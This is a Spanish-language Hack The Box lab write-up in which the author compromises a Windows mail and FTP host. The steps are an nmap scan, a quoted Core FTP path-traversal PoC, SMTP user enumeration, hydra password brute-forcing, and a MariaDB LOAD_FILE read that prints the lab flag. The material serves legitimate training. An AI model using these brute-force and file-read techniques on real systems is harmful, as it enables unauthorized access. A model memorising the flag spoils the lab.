La empresa Inlanefreight nos encargó realizar una prueba de penetración en tres hosts diferentes para comprobar la configuración y la seguridad de los servidores. Nos informaron de que se había colocado una bandera en cada servidor para demostrar el acceso exitoso. Estas banderas tienen el siguiente formato:

HTB{...}
Nuestra tarea consiste en revisar la seguridad de cada uno de los tres servidores y presentársela al cliente. Según nuestra información, el primer servidor gestiona correos electrónicos, clientes y sus archivos.

---
**Target: 10.129.203.7:**
**1. You are targeting the inlanefreight.htb domain. Assess the target server and obtain the contents of the flag.txt file. Submit it as the answer.**

Con un escaneo básico observo:
```
nmap -sCV -open --min-rate 200 -Pn -n 10.129.203.7
```

Respuesta: 
```
PORT     STATE SERVICE       REASON          VERSION
21/tcp   open  ftp           syn-ack ttl 127
| fingerprint-strings: 
|   GenericLines: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|     Command unknown, not supported or not allowed...
|     Command unknown, not supported or not allowed...
|   Help: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|     214-The following commands are implemented
|     USER PASS ACCT QUIT PORT RETR
|     STOR DELE RNFR PWD CWD CDUP
|     NOOP TYPE MODE STRU
|     LIST NLST HELP FEAT UTF8 PASV
|     MDTM REST PBSZ PROT OPTS CCC
|     XCRC SIZE MFMT CLNT ABORT
|     HELP command successful
|   NULL: 
|_    220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
25/tcp   open  smtp          syn-ack ttl 127 hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp   open  http          syn-ack ttl 127 Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
| http-methods: 
|_  Supported Methods: POST OPTIONS
| http-title: Welcome to XAMPP
|_Requested resource was http://10.129.203.7/dashboard/
|_http-favicon: Unknown favicon MD5: 56F7C04657931F2D0B79371B2D6E9820
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
443/tcp  open  https?        syn-ack ttl 127
| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US/organizationalUnitName=Test/localityName=test/emailAddress=fiona@inlanefreight.htb
| Issuer: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US/organizationalUnitName=Test/localityName=test/emailAddress=fiona@inlanefreight.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: shaWithRSAEncryption
| Not valid before: 2022-04-21T19:27:17
| Not valid after:  2032-04-18T19:27:17
| MD5:   27ed:2da8:8b25:57e3:d2fc:c0c8:9f0b:55b0
| SHA-1: 5018:d8d5:ba6b:5a1c:8df6:5969:45d7:fe06:3d32:7fad
| -----BEGIN CERTIFICATE-----
| MIIDcDCCAlwCAQAwCQYFKw4DAg8FADCBgTELMAkGA1UEBhMCVVMxCzAJBgNVBAgM
| AkZMMQ0wCwYDVQQHDAR0ZXN0MQ0wCwYDVQQLDARUZXN0MRAwDgYDVQQKDAdUZXN0... ...
| KuXOTzuf6pjUC5EMkncqdec8o4cVO1t4WJCs0iMaKH6tCB3oY80cYK0Z1PzQzYjz
| W5IEUFA9sdz67h79xdQcQHPHZmM=
|_-----END CERTIFICATE-----
587/tcp  open  smtp          syn-ack ttl 127 hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
3306/tcp open  mysql         syn-ack ttl 127 MySQL 5.5.5-10.4.24-MariaDB
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.24-MariaDB
|   Thread ID: 12
|   Capabilities flags: 63486
|   Some Capabilities: DontAllowDatabaseTableColumn, ConnectWithDatabase, Support41Auth, Speaks41ProtocolOld, LongColumnFlag, SupportsLoadDataLocal, InteractiveClient, IgnoreSigpipes, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsTransactions, ODBCClient, FoundRows, SupportsCompression, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: >VvpOz:Pc"yaZ!3z2(nu
|_  Auth Plugin Name: mysql_native_password
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-EASY
| Issuer: commonName=WIN-EASY
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-19T15:08:51
| Not valid after:  2026-04-20T15:08:51
| MD5:   adc5:8654:024a:9d64:7fb8:2659:7bbf:65ea
| SHA-1: ee00:1f7d:d9f1:fdd1:f546:0126:de73:d23b:7f5c:c9e2
| -----BEGIN CERTIFICATE-----
| MIIC1DCCAbygAwIBAgIQVXGl++AEVbxN0u6qKCWrEzANBgkqhkiG9w0BAQsFADAT... ....
| gv2ZsJ4gaQH8dOfEjKThQtnaTV0AG7Srq/KgtSUqw3dFPnwN0joXdX5HEGqMVoi9
| wKLnSLwaX0k=
|_-----END CERTIFICATE-----
|_ssl-date: 2025-10-20T15:12:47+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WIN-EASY
|   NetBIOS_Domain_Name: WIN-EASY
|   NetBIOS_Computer_Name: WIN-EASY
|   DNS_Domain_Name: WIN-EASY
|   DNS_Computer_Name: WIN-EASY
|   Product_Version: 10.0.17763
|_  System_Time: 2025-10-20T15:12:38+00:00
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=10/20%Time=68F65135%P=x86_64-pc-linux-gnu%r( ... ....
SF:CC\r\n\x20\x20\x20\x20\x20XCRC\x20\x20SIZE\x20\x20MFMT\x20\x20CLNT\x20\
SF:x20ABORT\r\n214\x20\x20HELP\x20command\x20successful\r\n");
Service Info: Host: WIN-EASY; OS: Windows; CPE: cpe:/o:microsoft:windows


```

Empezamos por:
```
21/tcp   open  ftp           syn-ack ttl 127
| fingerprint-strings: 
|   GenericLines: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|     Command unknown, not supported or not allowed...
|     Command unknown, not supported or not allowed...
|   Help: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|     214-The following commands are implemented
|     USER PASS ACCT QUIT PORT RETR
|     STOR DELE RNFR PWD CWD CDUP
|     NOOP TYPE MODE STRU
|     LIST NLST HELP FEAT UTF8 PASV
|     MDTM REST PBSZ PROT OPTS CCC
|     XCRC SIZE MFMT CLNT ABORT
|     HELP command successful
|   NULL: 
|_    220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
```

Buscando en google: 
>ftp FTP Server Version 2.0, build 725, 64-bit Unregistered exploit

Me encuentro que le afecta la siguiente vulnerabilidad: "CVE 2022-22836"
https://www.exploit-db.com/exploits/50652

Podría ejecutar según dicha página web:
```txt
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

Pero nunca encuentro unas credenciales válidas para iniciar dicho ataque.

Probaré con el siguiente servicio: SMTP:
```
25/tcp   open  smtp          syn-ack ttl 127 hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
```

Añado al /etc/hosts:
```
10.129.203.7 inlanefreight.htb
```

Y ejecutando:
```
smtp-user-enum -M RCPT -U userlist.list -D inlanefreight.htb -t 10.129.203.7
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... userlist.list
Target count ............. 1
Username count ........... 79
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Mon Oct 20 10:34:36 2025 #########
10.129.203.7: fiona@inlanefreight.htb exists
######## Scan completed at Mon Oct 20 10:34:37 2025 #########
1 results.

79 queries in 1 seconds (79.0 queries / sec)

```

Encuentro que "fiona" es un usuario válido.

Realizo un ataque de fuerza bruta con tal usuario pero no me da resultado ni con "rockyou" ni con el recurso "passwords.list" que ofrece HTB:
```

hydra -l "fiona@inlanefreight.htb" -P /usr/share/wordlists/rockyou.txt.gz -f inlanefreight.htb pop3
hydra -l "fiona@inlanefreight.htb" -P passwords.list -f inlanefreight.htb pop3

```

Pruebo la credencial "fiona" por FTP con el diccionario "rockyou" y me devuelve:
```
hydra -l "fiona" -P /usr/share/wordlists/rockyou.txt ftp://10.129.172.173 -t 1
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-20 10:51:16
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.129.172.173:21/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 14344339 to do in 2988:25h, 1 active
[21][ftp] host: 10.129.172.173   login: fiona   password: 987654321
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-20 10:52:28
```

Me conecto por FTP:
```
ftp fiona@10.129.134.140
```

Con credencial 987654321

Y desactivo el modo pasivo del ftp con "passive off".

Me descargo los archivos "docs.txt" y "WebServersInfo.txt".

Observo que puedo hacer en el servidor "ftp" un put del archivo que quiera y este se ve reflejado en "10.129.134.140", pero no puedo ejecutar ninguna webshell desde ahí, puesto que solo me deja descargar archivos.

Ejecuto:
```
mysql -u fiona -p'987654321' -h 10.129.203.7 --skip_ssl
```


```
MariaDB [(none)]> show variables like "secure_file_priv";
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
1 row in set (0,048 sec)
```

Y finalmente ejecuto:
```
MariaDB [(none)]> SELECT LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt");
+------------------------------------------------------+
| LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt") |
+------------------------------------------------------+
| HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}              |
+------------------------------------------------------+
1 row in set (0,054 sec)
```


